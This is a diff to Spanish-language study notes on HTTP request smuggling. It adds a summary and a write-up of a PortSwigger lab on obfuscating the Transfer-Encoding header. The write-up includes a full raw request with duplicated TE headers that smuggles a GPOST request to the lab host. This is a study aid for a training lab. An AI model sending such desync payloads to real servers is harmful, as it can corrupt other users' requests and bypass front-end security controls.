@@ -43,6 +43,7 @@ q=smuggling
 ### En este caso recordar que la cabecera Transfer-Encoding pasa datos de la siguiente maneja en salto de linea despues el valor en hex del tamaño de datos a pasar  + salto de linea +
 despues los datos en si ( b es 11 en hex) y al final ya cuando no se enviaran mas datos pone un 0 y el salto de linea y asi se acaba.
 
+## ***En Resumen*** http request smuggling es pasar de contrabando una solicitud al servidor de back-end, de modo que la próxima solicitud procesada por el servidor de back-end parezca usar el método GPOST u otra que tu definas porque no se engaña de donde termina.
 
 # Casos que se pueden encontrar 
 
@@ -105,6 +106,30 @@ Content-Length: 15
 x=1
 0
 
+
+```
+
+# HTTP request smuggling, obfuscating the TE header
+
+Para este lab solo se ofusco la cabecera añadiendole el "Transfer-encoding: cow"
+
+```
+POST / HTTP/1.1
+Host: 0a920094049d0bffc0ba45dc00cc0016.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
 
 
 ```
